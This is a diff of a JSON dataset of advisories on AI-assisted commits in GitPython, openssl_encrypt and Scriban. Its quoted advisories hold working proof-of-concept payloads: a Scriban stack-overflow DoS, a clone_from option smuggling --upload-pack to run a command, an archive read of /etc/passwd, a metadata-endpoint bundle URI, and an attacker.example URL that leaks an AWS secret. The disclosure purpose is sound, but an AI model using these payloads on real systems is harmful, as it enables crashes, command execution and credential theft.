@@ -1024,16 +1024,16 @@
      "GHSA-R9MR-M37C-5FR3"
     ],
     "original_mechanism": "Git command keyword options could smuggle unsafe dash-prefixed value tokens.",
-    "original_sink": "GitPython shared _option_candidates unsafe-option guard",
+    "original_sink": "GitPython unsafe-option checks for fetch, pull, push and clone that compare only keyword option names",
     "original_author_kind": "HUMAN",
-    "original_author_name": "Michael Trier",
-    "original_sha": "039bfe373c990fc6db3808d255abaff91235e82f",
+    "original_author_name": "Santos Gallegos",
+    "original_sha": "e6108c7997f5c8f7361b982959518e982b973230",
     "unresolved_reason": null,
     "attempted_remediation": {
      "candidate_shas": [
       "701ce32fe5ba8cb622c0e0342a376a6beb47d738"
      ],
-     "changed": "Created shared unsafe Git option guards for keyword arguments.",
+     "changed": "Created shared unsafe-option candidate extraction for keyword arguments.",
      "missed": "Did not reject dash-prefixed values associated with otherwise allowed options."
     },
     "residual_bypass": "An option value beginning with a dash was interpreted as another Git option.",
@@ -3062,7 +3062,7 @@
     "language": "Python",
     "archived": false
    },
-   "mechanism": "The AI change added an expand_vars switch to the shared URL helper with expansion still on by default and turned it off only on the clone path, so create_remote and submodule URLs were still written into git configuration after os.path.expandvars had replaced ${...} references with process environment values; the completing change passes the switch at those two remaining callers.",
+   "mechanism": "GitPython ran repository URLs through os.path.expandvars, replacing ${...} references with values from the process environment, and has done so since a 2019 human change first released in 3.0.4. An AI-assisted hardening change in 3.1.52 added a switch to turn the expansion off but used it only on the clone path, so URLs passed to create_remote or Submodule.add were still expanded and written into git configuration, and a later fetch or pull sent the embedded secret to the URL's host. A follow-up change, first released in 3.1.55, passes the switch at those two callers.",
    "description": "The advisory covers the second half of a two-part boundary. The previous release had removed environment-variable expansion from clone URLs, and the change that did so introduced the switch which made the removal possible. That switch left expansion enabled for every caller that did not opt out, and only the clone path opted out, so Remote.create, reached through Repo.create_remote and its Remote.add alias, and Submodule.add still normalized caller-supplied URLs with expansion on. A URL such as http://attacker.example/${AWS_SECRET_ACCESS_KEY}/repo.git was written into .git/config with the secret substituted, and the next fetch or pull transmitted it to the attacker's host; the submodule path also wrote the expanded value into the tracked .gitmodules file. The completing change passes expand_vars=False at those two remaining callers, so configuration keeps the literal URL and protocol validation sees the same bytes Git receives.",
    "code_evidence": {
     "summary": "An AI-assisted change stopped environment expansion on clone URLs but left the same expansion in the remote and submodule callers, so a URL passed to create_remote or add could embed the hosting process's secrets and carry them to the attacker's host."
@@ -3080,7 +3080,7 @@
     "language": "Python",
     "archived": false
    },
-   "mechanism": "The limiter recorded attempts in process memory and kept that dictionary on the class rather than in shared storage, so the count was per worker and disappeared on restart. Lockout decisions compared only the current process's timestamps, so requests that landed on a different worker were treated as fresh.",
+   "mechanism": "The Pepper module's TOTP and backup-code checks in the openssl_encrypt server had no attempt limit when a Claude-assisted change first added them, so a client holding a valid certificate could keep guessing codes on routes such as account deletion, the panic routes, TOTP disable and backup-code regeneration. Later hardening added a five-attempt limit, but it counts attempts in each process's memory, so the count resets on restart and is not shared between workers. A shared database backend exists but is not the default, and the extracted server project still ships the in-memory default, so the flaw remains unpatched. Published releases 1.4.0b3 through 1.4.1 carry it.",
    "description": "openssl_encrypt's TOTP verification gained rate limiting through an in-memory defaultdict(list) held as a class variable in openssl_encrypt_server/modules/pepper/totp.py. Attempt timestamps and lockout deadlines lived inside a single process, so each extra worker and every restart started with an empty history. An attacker could spread guesses across workers or wait for a restart to keep submitting codes past the intended limit. The fix moves limiter storage behind a backend interface and adds a database implementation with its own table and expired-entry cleanup.",
    "candidate_set": [
     "1b6f732232018609189c863a165a11aaa89db250"
@@ -3125,7 +3125,7 @@
    },
    "code_evidence": {
     "ai_marker": "Co-Authored-By: Claude Sonnet 4.5 <noreply@anthropic.com>",
-    "summary": "AI-written TOTP rate limiter stored attempts in a per-process class variable, so rate limits reset across workers/restarts and attackers can bypass them.",
+    "summary": "A Claude-assisted change added TOTP and backup-code checks with no attempt limit, and the limiter added later counts attempts only in each process's memory, so a client with a valid certificate can keep guessing codes.",
     "candidate_url": "https://github.com/jahlives/openssl_encrypt/commit/1b6f732232018609189c863a165a11aaa89db250",
     "fix_url": "https://github.com/jahlives/openssl_encrypt/commit/2749bc0949b34a5921a35fb4a3f1856fc51916de"
    }
@@ -6106,7 +6106,7 @@
     "language": "C#",
     "archived": false
    },
-   "mechanism": "The depth check in EnterExpression records a non-fatal parse error and sets a flag used only to suppress duplicate messages, so recursion in src/Scriban/Parsing/Parser.Expressions.cs continued past ExpressionDepthLimit until the thread stack was exhausted. .NET then raised a StackOverflowException that cannot be caught and that terminates the host process.",
+   "mechanism": "Scriban's parser has an expression depth limit, but the helper that enforces it only records a parse error and keeps descending, so a deeply nested template still recurses until the thread stack runs out; .NET then raises a StackOverflowException that cannot be caught and that terminates the host process. A human change turned the limit on by default in 6.6.0 with this log-only helper. A Copilot-co-authored change in 7.0.0 set out to bound the previously unlimited array-initializer route but reused the same helper, so the parser stayed vulnerable. A human fix in 7.2.1 makes parsing stop at the limit or when native stack headroom runs low.",
    "description": "### Summary\n\nThe `ExpressionDepthLimit` parser guard in Scriban does not actually stop parsing — it only logs a non-fatal error and lets recursive descent continue. As a result, a template containing a deeply nested expression (parentheses, array initializers, object initializers, or unary operators) drives the recursive-descent parser into a native stack overflow. The resulting `StackOverflowException` is **uncatchable** in .NET and **immediately terminates the host process**.\n\nAny application that parses an attacker-influenced template — or that passes attacker-controlled strings to `object.eval` / `object.eval_template` — can be crashed by a single small request (roughly an 8 KB payload). This is a denial-of-service. It affects both Scriban-native (`Template.Parse`) and Liquid (`Template.ParseLiquid`) syntax modes, which share the same expression parser.\n\nThis re-opens two advisories that were reported as fixed: **GHSA-wgh7-7m3c-fx25** (\"Uncontrolled recursion in parser → StackOverflow\", reported fixed in 6.6.0) and **GHSA-p6q4-fgr8-vx4p** (\"StackOverflow via nested array initializers bypasses ExpressionDepthLimit\", reported fixed in 7.0.0). Both fixes are incomplete: the limit they rely on never halts recursion. **All releases 6.6.0 through 7.2.0 (current) are affected.**\n\n### Details\n\nThe depth guard is `EnterExpression()` in `src/Scriban/Parsing/Parser.Expressions.cs`:\n\n```csharp\n// src/Scriban/Parsing/Parser.Expressions.cs:1209-1218\nprivate void EnterExpression()\n{\n _expressionDepth++;\n var limit = Options.ExpressionDepthLimit;\n if (limit > 0 && !_isExpressionDepthLimitReached && _expressionDepth > limit)\n {\n LogError(GetSpanForToken(Previous), $\"The statement depth limit `{limit}` was reached when parsing this statement\");\n _isExpressionDepthLimitReached = true;\n }\n}\n```\n\nWhen the limit is exceeded it calls `LogError(...)` and sets a flag. It does **not** throw, does **not** return a sentinel, and does **not** unwind the parse. `LogError` here uses the default `isFatal: false`, so it merely appends a message and sets `HasErrors` — parsing proceeds:\n\n```csharp\n// src/Scriban/Parsing/Parser.cs:476-488\nprivate void Log(LogMessage logMessage, bool isFatal = false)\n{\n Messages.Add(logMessage);\n if (logMessage.Type == ParserMessageType.Error)\n {\n HasErrors = true;\n if (isFatal) _hasFatalError = true; // not set on the depth-limit path\n }\n}\n```\n\nThe flag `_isExpressionDepthLimitReached` is consulted **only** to avoid logging the same error more than once — no code path uses it to stop descending. Confirmed by full-repo search (`grep -rn \"_isExpressionDepthLimitReached\" src/`): it appears in exactly four places — the field declaration (`Parser.cs:40`), a reset to `false` (`Parser.cs:106`), and within `EnterExpression` the dedup test (`Parser.Expressions.cs:1213`) and its assignment to `true` (`:1216`). The only *read* is the dedup test on line 1213; nothing else reads it. `ParseExpression` calls `EnterExpression()` and then continues straight into the token switch with no flag check:\n\n```csharp\n// src/Scriban/Parsing/Parser.Expressions.cs:113 + 181-182\nEnterExpression();\ntry\n{\n ...\n case TokenType.OpenParen:\n leftOperand = ParseParenthesis(); // recurses back into ParseExpression\n```\n\n```csharp\n// src/Scriban/Parsing/Parser.Expressions.cs:984-1001\nprivate ScriptExpression ParseParenthesis()\n{\n var expression = Open<ScriptNestedExpression>();\n ExpectAndParseTokenTo(expression.OpenParen, TokenType.OpenParen);\n expression.Expression = ExpectAndParseExpression(expression); // -> ParseExpression -> ParseParenthesis -> ...\n ...\n}\n```\n\nBoth `Template.Parse` (Scriban-native) and `Template.ParseLiquid` (Liquid-compatibility) front-ends share this same expression parser, so both entry points are affected.\n\nSo for input nested N levels deep, the parser recurses N levels deep regardless of `ExpressionDepthLimit`. There is no `RuntimeHelpers.EnsureSufficientExecutionStack()` call and no absolute recursion cap anywhere in the parser. Once the native thread stack is exhausted, the runtime raises `StackOverflowException`, which .NET does not allow to be caught and which tears down the entire process. The number of nesting levels required to overflow depends on the platform's thread-stack size (empirically around 4,000 levels on a default 1 MB stack); it is not a configurable mitigation.\n\nThe same defective guard is what makes the array-initializer fix for GHSA-p6q4-fgr8-vx4p ineffective: `ParseArrayInitializer` was wrapped in `EnterExpression()/LeaveExpression()`, but because `EnterExpression()` only logs, the array path still overflows.\n\nThe existing regression tests only assert `HasErrors == true` at a nesting depth of ~20 with a limit of 10 (`src/Scriban.Tests/TestParser.cs`); they never use a depth large enough to overflow the stack, so they pass while the protection does nothing against the actual DoS.\n\n**Runtime reachability without template injection:** `object.eval` / `object.eval_template` (`src/Scriban/Functions/ObjectFunctions.cs:72-155`) re-parse a string argument at render time using `Template.Parse(...)`. An application whose own templates are fully trusted is still vulnerable if any user-controlled value flows into `object.eval`. The `catch (Exception)` inside `Eval` cannot intercept the `StackOverflowException`.\n\n### PoC\n\nA single console project reproduces it on the released NuGet package.\n\n`poc.csproj`:\n```xml\n<Project Sdk=\"Microsoft.NET.Sdk\">\n <PropertyGroup>\n <OutputType>Exe</OutputType>\n <TargetFramework>net8.0</TargetFramework>\n <!-- If only the .NET 9 SDK is installed, change to net9.0. Behavior is identical. -->\n </PropertyGroup>\n <ItemGroup>\n <PackageReference Include=\"Scriban\" Version=\"7.2.0\" />\n </ItemGroup>\n</Project>\n```\n\n`Program.cs`:\n```csharp\nusing Scriban;\n\nint n = 8000; // ~8 KB template; 8000 reliably overflows a default 1 MB thread stack\nstring tpl = \"{{ \" + new string('(', n) + \"1\" + new string(')', n) + \" }}\";\n\nSystem.Console.WriteLine($\"Parsing template with {n} nested parentheses (default ParserOptions)...\");\nTemplate.Parse(tpl); // <-- process is killed here\nSystem.Console.WriteLine(\"Parse returned without crashing\"); // never reached\n```\n\nRun:\n```sh\ndotnet run -c Release\n```\n\nObserved output (process aborts; shell exit code 134 = SIGABRT):\n```\nParsing template with 8000 nested parentheses (default ParserOptions)...\nStack overflow.\n at Scriban.Parsing.Parser.ParseParenthesis()\n at Scriban.Parsing.Parser.ParseExpression(...)\n at Scriban.Parsing.Parser.ExpectAndParseExpression(...)\n at Scriban.Parsing.Parser.ParseParenthesis()\n ... (repeats until the stack is exhausted)\n```\n\nAdditional confirmations (same crash / exit 134), substituting the template body in `Program.cs`:\n\nThe explicit limit is ignored — still crashes:\n```csharp\nTemplate.Parse(tpl, parserOptions: new ParserOptions { ExpressionDepthLimit = 10 });\n```\n\nArray initializers (the GHSA-p6q4 path):\n```csharp\nstring tpl = \"{{ \" + new string('[', n) + \"1\" + new string(']', n) + \" }}\";\nTemplate.Parse(tpl); // crashes identically\n```\n\nObject initializers `{x:{x:...{x:1}...}}`:\n```csharp\nvar b = new System.Text.StringBuilder();\nfor (int i = 0; i < n; i++) b.Append(\"{x:\");\nb.Append('1');\nb.Append('}', n);\nTemplate.Parse(\"{{ \" + b + \" }}\"); // crashes identically\n```\n\nUnary operators:\n```csharp\nstring tpl = \"{{ \" + new string('!', n) + \"true\" + \" }}\";\nTemplate.Parse(tpl); // crashes identically\n```\n\nLiquid syntax mode (shares the same expression parser):\n```csharp\nstring tpl = \"{{ \" + new string('(', n) + \"1\" + new string(')', n) + \" }}\";\nTemplate.ParseLiquid(tpl); // crashes identically\n```\n\nRuntime via `object.eval`, with a fully trusted outer template — verified end-to-end: the outer parse reports `HasErrors == false`, then `Render()` crashes the process and the surrounding `try/catch` never fires (the `StackOverflowException` is uncatchable):\n```csharp\nusing Scriban;\n\nint n = 8000;\nstring deep = new string('(', n) + \"1\" + new string(')', n);\nstring outer = \"{{ \\\"\" + deep + \"\\\" | object.eval }}\";\n\nSystem.Console.WriteLine($\"Outer template length = {outer.Length} chars.\");\nvar t = Template.Parse(outer);\nSystem.Console.WriteLine($\"Outer parsed. HasErrors = {t.HasErrors}\");\nSystem.Console.WriteLine(\"Rendering (object.eval re-parses the inner string at runtime)...\");\ntry\n{\n t.Render();\n System.Console.WriteLine(\"Render returned without crashing\");\n}\ncatch (System.Exception e)\n{\n System.Console.WriteLine($\"Caught {e.GetType().Name} (note: StackOverflowException cannot be caught)\");\n}\n```\n\nVerified against clean NuGet installs of Scriban **6.6.0, 7.0.0, 7.1.0, and 7.2.0** (net8.0, .NET 9 runtime, Linux). A control template with depth 200 parses normally (`HasErrors == false`, no crash).\n\n### Impact\n\n- **Type:** Denial of service via uncontrolled recursion (CWE-674) leading to an uncatchable `StackOverflowException` and full process termination.\n- **Severity:** CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` = **7.5 (High)** — the same vector and score as both prior advisories it re-opens (GHSA-wgh7-7m3c-fx25 and GHSA-p6q4-fgr8-vx4p, each scored 7.5 High with the identical `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` vector). The score reflects the library boundary, where no privileges are required to parse a template; the privilege actually needed in a given deployment depends on how that application exposes template input.\n- **Who is impacted:** Any application that calls `Template.Parse` / `Template.ParseLiquid` (or `Template.Render` on an unparsed source) on template text that is wholly or partially attacker-controlled — the documented server-side template scenario — and any application that passes attacker-controlled strings to `object.eval` / `object.eval_template`, even when its own templates are trusted.\n- **Why the existing mitigation does not help:** `ExpressionDepthLimit` (default 250) is advisory only; it records a parse error but does not stop recursion, so it cannot prevent the stack overflow. Because the exception is a `StackOverflowException`, callers cannot defend with `try/catch` either — the process is lost.\n- **Affected versions:** 6.6.0 – 7.2.0 (all versions shipping the depth-limit guard). Versions before 6.6.0 are vulnerable to the original unbounded-recursion condition.\n\n**Suggested remediation:** make the limit actually stop descent — e.g. throw a parse exception from `EnterExpression()` when the limit is exceeded (or log with `isFatal: true` and have the parse loop honor `_hasFatalError` by unwinding). As defense in depth, call `RuntimeHelpers.EnsureSufficientExecutionStack()` at the entry of `ParseExpression` (the same technique already used in `object.to_json`), and add a regression test at a depth that overflows without the fix (e.g. 100,000), asserting a graceful exception rather than only checking `HasErrors` at depth 20.",
    "candidate_set": [
     "f55280a09575e577fcf7f5629007e0814594e3ac"
@@ -6189,7 +6189,7 @@
    },
    "code_evidence": {
     "ai_marker": "Co-authored-by: Copilot <223556219+Copilot@users.noreply.github.com>",
-    "summary": "The AI-written ExpressionDepthLimit guard only logged a non-fatal error instead of stopping recursive descent. A deeply nested template drives the .NET parser into an uncatchable StackOverflowException that terminates the host.",
+    "summary": "A Copilot-co-authored change meant to bound recursion in Scriban's array initializers reused a depth check that only logged an error, so deeply nested templates could still crash the host with an uncatchable stack overflow.",
     "candidate_url": "https://github.com/scriban/scriban/commit/f55280a09575e577fcf7f5629007e0814594e3ac",
     "fix_url": "https://github.com/scriban/scriban/commit/8fdbd687bbe8f00085c4c4c5b2b3b8d529933949"
    }
@@ -12341,7 +12341,7 @@
     "language": "Python",
     "archived": false
    },
-   "mechanism": "The denylist that Repo.archive() relies on, unsafe_git_archive_options in git/repo/base.py, blocks only --exec, --output and -o, so --add-file, --add-virtual-file and --bundle-uri still reach git archive unchanged; --add-file copies a caller-chosen path, including absolute paths outside the repository, into the archive the caller receives. The fix adds all three options to the denylist and covers them in new regression tests.",
+   "mechanism": "An AI-written hardening change added option denylists to GitPython's Repo.archive() and clone helpers, but the archive list blocked only --exec, --output and -o, and the clone list omitted --bundle-uri. Keyword options passed to archive could therefore still add --add-file, which copies a caller-chosen path, including absolute paths outside the repository, into the archive the caller receives, or --add-virtual-file, which injects chosen content; a clone could still be pointed at an extra bundle URI. The repair, first released in 3.1.57, adds all three options to the denylists.",
    "description": "**Target:** gitpython-developers/GitPython\n**Tested:** HEAD `07e80555` (2026-07-25), latest release 3.1.55, `git version 2.50.1`\n\n## Summary\n\n`Repo.archive()` does call the option guard, so this is not a missing-guard report. The guard is present and working; the **denylist it consults is incomplete**.\n\n```python\n# git/repo/base.py:169\nunsafe_git_archive_options = [\n # Allows arbitrary command execution through the remote git-upload-archive command.\n \"--exec\",\n # Writes output to a caller-controlled filesystem path.\n \"--output\",\n \"-o\",\n]\n```\n\nThe comment on `--output` states the protected class in the project's own words: an option that lets the caller name **a filesystem path** is unsafe. `--output` is blocked because it *writes* to a caller-chosen path.\n\n`git archive` also accepts `--add-file=<path>` and `--add-virtual-file=<path:content>` (both present in current git; verified against `git version 2.50.1`). `--add-file` *reads* a caller-chosen path — including an absolute path outside the repository — and places the bytes into the archive the caller receives. Neither option is in the list, and no other layer references them:\n\n```\n$ grep -rniE \"add.file|add_file\" git/\ngit/index/base.py:771: R\"\"\"Add files from the working tree, ... # unrelated docstring\n```\n\nNet effect: the guard blocks arbitrary file **write** at this sink while permitting arbitrary file **read** at the same sink.\n\n## Reachability proof (verified at the sink)\n\n`poc/poc_addfile.py` at HEAD `07e80555`. The PoC creates its own out-of-tree canary, so it runs from a clean machine:\n\n```\n-- CONTROL: options the denylist covers (expect BLOCKED) --\n [BLOCKED] output='/tmp/gp_written.tar': --output is not allowed, use `allow_unsafe_options=True` to allow it.\n [BLOCKED] o='/tmp/gp_written.tar': -o is not allowed, use `allow_unsafe_options=True` to allow it.\n [BLOCKED] exec='touch /tmp/gp_exec': --exec is not allowed, use `allow_unsafe_options=True` to allow it.\n\n-- SIBLING OMITTED FROM THE DENYLIST: --add-file (expect ALLOWED) --\n [ALLOWED] add_file='/tmp/gp_canary.txt' -> archive 10240 bytes\n archive members: ['f.txt', 'gp_canary.txt']\n >>> EXFILTRATED gp_canary.txt: 'secret-canary-12345'\n >>> byte-for-byte match with the out-of-tree file: CONFIRMED\n\n-- also: --add-virtual-file (attacker-chosen name AND content) --\n [ALLOWED] add_virtual_file='pwn.txt:hello' -> archive 10240 bytes\n```\n\nThe three blocked lines are the control: they prove the guard is active on this call path, so the fourth result is a gap in list membership rather than a guard that never ran.\n\nMinimal reproduction:\n\n```python\nimport io, tarfile\nfrom git import Repo\n\nbuf = io.BytesIO()\nRepo(\"/path/to/repo\").archive(buf, format=\"tar\", add_file=\"/etc/passwd\")\nprint(tarfile.open(fileobj=io.BytesIO(buf.getvalue())).getnames())\n# ['<repo files>', 'passwd'] <- contents readable by whoever receives the archive\n```\n\nThe canary is untracked and lives outside the repository; its contents are recovered from the returned archive and asserted byte-for-byte against the on-disk file. The option is rendered by `transform_kwargs` into `--add-file=<path>` and reaches `git archive` unmodified.\n\n## Direct precedent\n\n`GHSA-6p8h-3wgx-97gf` (High, published 2026-07-22) is the same defect on the sibling list: *\"Incomplete `unsafe_git_clone_options` denylist omits `--template`\"* — an option absent from one of these denylists, reachable under the same caller-controlled-options precondition, accepted and fixed by adding it. `git log` shows the archive list itself has already been extended reactively once, in `701ce32f` (*fix: Guard unsafe git command options*, GHSA-956x-8gvw-wg5v), and the `--template` omission was then fixed separately in `ffcb5359`.\n\n## `--add-virtual-file` is the same gap pointing the other way\n\n`--add-virtual-file=<path:content>` lets the caller inject **attacker-chosen content under an attacker-chosen name** into an archive that downstream consumers will reasonably treat as repository-derived.\n\n## Suggested remediation\n\n1. **Preferred — allowlist.** `Repo.archive()` has a small legitimate option surface (`format`, `prefix`, `worktree_attributes`, `remote`, compression level, plus paths). Accepting those and rejecting the rest means a future git release cannot add another path-taking option that silently reopens this.\n2. **Minimum — extend the list** with `--add-file` and `--add-virtual-file`, and make the membership rule *\"the option takes a filesystem path or URL\"* rather than *\"the option executes a command\"*. The existing comment on `--output` already implies that rule; applying it consistently is what closes the class instead of this instance.\n\n## Scope limits\n\n- Impact is **arbitrary file read at the privileges of the process**. Not code execution — I make no such claim here.\n- It requires the embedding application to forward caller-influenced kwargs into `Repo.archive()`. That is the identical precondition to `--output`, `--exec` and `--template`, all of which this project has treated as reportable.\n\n## Disclosure\n\nReported privately via GitHub private vulnerability reporting. Happy to test a candidate patch against the PoC. No public disclosure until you have shipped a fix and are ready.\n---\n\n## Addendum (2026-07-25) — related observation on the same membership question, filed here rather than separately\n\nWhile auditing the archive denylist, the same class of gap was identified in unsafe_git_clone_options. A second advisory is not being requested, as the issue is lower severity and should inform the fix for the issue above rather than require separate triage. Recording it here to provide the complete picture in one place.\n\n`Repo._clone()` treats a URL's protocol as a security boundary and applies `check_unsafe_protocols()` to exactly one input:\n\n```python\nclone_url = Git.polish_url(url, expand_vars=False)\nif not allow_unsafe_protocols:\n Git.check_unsafe_protocols(clone_url) # the positional url only\n```\n\n`git clone` accepts a **second** URL via `--bundle-uri=<uri>`, which git dereferences before the main transport runs. That option is absent from `unsafe_git_clone_options`, so the option guard passes it, and `check_unsafe_protocols()` never inspects it. A caller-influenced value therefore drives an outbound request from the host:\n\n```python\nRepo.clone_from(trusted_url, dest,\n multi_options=[\"--bundle-uri=http://169.254.169.254/latest/meta-data/\"])\n# no UnsafeProtocolError, no UnsafeOptionError\n```\n\nConfirmed against a local listener — the request leaves the process:\n\n```\n127.0.0.1 - - [24/Jul/2026 23:07:41] \"GET /internal-metadata HTTP/1.1\" 404 -\n```\n\n`file:///path` is likewise accepted without error. Note this is **not** a tokenisation bypass: `multi_options` is `shlex.split` before the check (per `c9a26789` / GHSA-x2qx-6953-8485), so the fully-split `--bundle-uri=...` token is checked and legitimately passes because the option is not on the list.\n\nWhy it belongs with this report: both are the *membership* question rather than the matching logic — is the set of blocked options complete, and does the protocol guard inspect every URL git will dereference? The structural remediation proposed above covers both if extended slightly: prefer an allowlist per command, and route **every** URL-bearing option through `check_unsafe_protocols()`, not only the positional URL. Adding `--bundle-uri` to `unsafe_git_clone_options` would be the minimal fix.",
    "candidate_set": [
     "701ce32fe5ba8cb622c0e0342a376a6beb47d738"
@@ -12353,25 +12353,25 @@
     "original_advisory_ids": [
      "GHSA-539M-9XH6-Q6RR"
     ],
-    "original_mechanism": "Git archive callers accepted output-affecting command options from untrusted input.",
-    "original_sink": "GitPython unsafe_git_archive_options for archive command construction",
+    "original_mechanism": "Repo.archive() and clone forwarded caller keyword arguments to git as command options.",
+    "original_sink": "GitPython Repo.archive() keyword forwarding to git archive, and clone keyword forwarding to git clone",
     "original_author_kind": "HUMAN",
-    "original_author_name": "Michael Trier",
-    "original_sha": "33ebe7acec14b25c5f84f35a664803fcab2f7781",
+    "original_author_name": "Sebastian Thiel",
+    "original_sha": "b67bd4c730273a9b6cce49a8444fb54e654de540",
     "unresolved_reason": null,
     "attempted_remediation": {
      "candidate_shas": [
       "701ce32fe5ba8cb622c0e0342a376a6beb47d738"
      ],
-     "changed": "Created an archive option denylist containing --exec and --output.",
-     "missed": "Omitted --add-file and --add-virtual-file."
+     "changed": "Created archive and clone option denylists.",
+     "missed": "Omitted --add-file and --add-virtual-file from the archive denylist and --bundle-uri from the clone denylist."
     },
-    "residual_bypass": "The omitted archive options could inject attacker-selected files into output.",
+    "residual_bypass": "The omitted options let caller keyword arguments read local files into an archive, inject archive content, or point a clone at an extra bundle URI.",
     "final_closure": {
      "minimum_fix_shas": [
       "7a4f5dcb7bf3cbcbf6e438017efcdfe0bc0d36ca"
      ],
-     "closed": "Added both file-injection options to the archive denylist."
+     "closed": "Added all three options to the denylists."
     }
    },
    "vulnerable_release": {
@@ -12433,7 +12433,7 @@
     ]
    },
    "code_evidence": {
-    "summary": "GitPython’s AI-written `Repo.archive()` option guard uses an incomplete denylist, allowing `--add-file` and `--bundle` options to write to attacker-controlled filesystem paths.",
+    "summary": "An AI-written option guard for GitPython's Repo.archive() and clone left --add-file, --add-virtual-file and --bundle-uri off its denylists, so caller-supplied keyword options could still read arbitrary local files into an archive or point a clone at an extra bundle.",
     "candidate_url": "https://github.com/gitpython-developers/GitPython/commit/701ce32fe5ba8cb622c0e0342a376a6beb47d738",
     "fix_url": "https://github.com/gitpython-developers/GitPython/commit/7a4f5dcb7bf3cbcbf6e438017efcdfe0bc0d36ca"
    }
@@ -15153,7 +15153,7 @@
     "language": "Python",
     "archived": false
    },
-   "mechanism": "The check added in git/cmd.py only collected dash-prefixed values from one-letter keyword options when len(key) == 1 and split_single_char_options was true, so with splitting disabled the joined token Git parses as clustered switches never reached the forbidden-option check.",
+   "mechanism": "GitPython's clone helpers refuse unsafe options such as upload-pack unless the caller opts in, but the check looks at the option names a caller passes rather than the arguments that reach git. With single-character option splitting turned off, a one-letter keyword option and its value are joined into one token, and git reads that token as a cluster of short switches that can include -u, its short form of upload-pack, so attacker-controlled keyword options to clone can still run a command. Releases before 3.1.30 have no such protection at all, and the protection added in 3.1.30 and the keyword check added in 3.1.32 never inspect the joined form. An AI-written change in 3.1.54 added a check on split short-option values that still missed the joined token; the clone-path repair first shipped in 3.1.58.",
    "description": "## Summary\nThe `check_unsafe_options` guard can be bypassed on every guarded method (clone/clone_from, fetch/pull/push, ls_remote, iter_commits, blame, archive) by combining a single-character kwarg with `split_single_char_options=False`. The guard's candidate list omits the smuggled option, but `transform_kwarg` emits a JOINED `-n<value>` argv token that git parses as `--upload-pack=<cmd>`, yielding arbitrary command execution at the default `allow_unsafe_options=False`. This is an incomplete-fix bypass of commit `e8d0fbf7` (the fix for GHSA-r9mr-m37c-5fr3), which only emits value-derived candidates when `split_single_char_options` is True.\n\n## Root Cause\n`_option_candidates` derives value-token candidates only under `if len(key)==1 and split_single_char_options:` (cmd.py:1048, added by `e8d0fbf7`). With `split_single_char_options=False`, `_option_candidates([], {\"n\":\"utouch <cmd>;git-upload-pack\"})` returns only `['-n']` (not on the denylist), so the guard passes. But `transform_kwarg('n', value, split_single_char_options=False)` emits the JOINED token `-nutouch <cmd>;git-upload-pack` (cmd.py:1631). git clusters value-less short flags then parses `-u<cmd>` = `--upload-pack=<cmd>` → command execution. The hardened guard WOULD block the joined token if it saw it — the flaw is it never receives it.\n\n## Impact\nArbitrary OS command execution as the host process (via `--upload-pack`) at default `allow_unsafe_options=False`, affecting all guarded methods that forward kwargs. Precondition: the app forwards a user-controlled kwargs dict containing `split_single_char_options=False` plus a single-char key (same user-dict-forwarding model GHSA-r9mr-m37c-5fr3 accepts).\n\n## Proof of Concept\n```python\nfrom git import Repo\nRepo.clone_from(src, dst,\n n=\"utouch /tmp/ACE;git-upload-pack\",\n split_single_char_options=False) # /tmp/ACE created -> ACE\n```\n\n## Attack Chain\n1. Entry: app forwards user kwargs to `Repo.clone_from(url, path, **kwargs)`: `{split_single_char_options: False, n: 'utouch /tmp/ACE;git-upload-pack'}`.\n2. Check: `check_unsafe_options(_option_candidates([], kwargs), unsafe_git_clone_options)`. Guard: denylist includes `--upload-pack`/`-u`. Bypass proof: `_option_candidates` yields only `['-n']` (value token skipped because `split=False`); guard never sees `-u`.\n3. Sink: `transform_kwarg` emits joined token (cmd.py:1631). argv (observed): `['git','clone','-v','-nutouch /tmp/ACE;git-upload-pack','--','<src>','<dst>']`.\n4. Impact: git clusters `-n` + `-u<cmd>` → runs upload-pack command → ACE.\n\n## Bypass Evidence\nIndependently reproduced (gate harness, default `allow_unsafe_options=False`): the `split=False` payload created the marker `VH05_GATE_ACE` (ACE); the clone returned normally (guard bypassed). Control: `n='--upload-pack=…'` (split default True) → `UnsafeOptionError: --upload-pack is not allowed`. Fix-commit read: `e8d0fbf7` extends candidates only under `if len(key)==1 and split_single_char_options:` — split=False skips value emission. Also confirmed the earlier clustering-parse fix (commit `56806080`) does not cover this because the guard only ever receives `['-n']`.\n\n## Affected Versions\n`GitPython <= 3.1.57` (code present verbatim on the latest release tag).\n\n## Suggested Fix\nMake `_option_candidates` emit value-derived candidates regardless of `split_single_char_options` (i.e. also for the joined `-n<value>` form), OR run `check_unsafe_options` over the fully-transformed argv rather than the reconstructed name-only candidate list.\n\n---\nReported by **zx (Jace)** — GitHub: @manus-use",
    "candidate_set": [
     "e8d0fbf774d1f6baa3b481adfe48bd262e43b453"
@@ -15209,9 +15209,34 @@
    },
    "code_evidence": {
     "ai_marker": "Co-authored-by: Sebastian Thiel <sebastian.thiel@icloud.com>",
-    "summary": "AI-written code allowed a single-character kwarg with split_single_char_options=False to smuggle joined git options, bypassing the guard and enabling arbitrary command execution.",
+    "summary": "An AI-written hardening change checked split short-option values but not the joined form, so attacker-controlled keyword options to GitPython's clone could still smuggle in git's upload-pack option and run a command.",
     "candidate_url": "https://github.com/gitpython-developers/gitpython/commit/e8d0fbf774d1f6baa3b481adfe48bd262e43b453",
     "fix_url": "https://github.com/gitpython-developers/gitpython/commit/96a888f4d782cb2f80452148e48e60ce4af6d541"
+   },
+   "ir_chain": {
+    "original_advisory_ids": [
+     "GHSA-WVPP-8HX9-P66J"
+    ],
+    "original_mechanism": "GitPython's clone unsafe-option protection never inspected the joined token that a one-letter keyword option and its value form when option splitting is off.",
+    "original_sink": "GitPython clone unsafe-option checks in Repo._clone",
+    "original_author_kind": "HUMAN",
+    "original_author_name": "Santos Gallegos",
+    "original_sha": "e6108c7997f5c8f7361b982959518e982b973230",
+    "unresolved_reason": null,
+    "attempted_remediation": {
+     "candidate_shas": [
+      "e8d0fbf774d1f6baa3b481adfe48bd262e43b453"
+     ],
+     "changed": "Added dash-prefixed values of split one-letter options to the unsafe-option candidates.",
+     "missed": "Left the joined token emitted when splitting is off out of the candidates."
+    },
+    "residual_bypass": "With splitting off, a one-letter option and its value reach Git as one token that Git reads as clustered switches, including -u for upload-pack.",
+    "final_closure": {
+     "minimum_fix_shas": [
+      "96a888f4d782cb2f80452148e48e60ce4af6d541"
+     ],
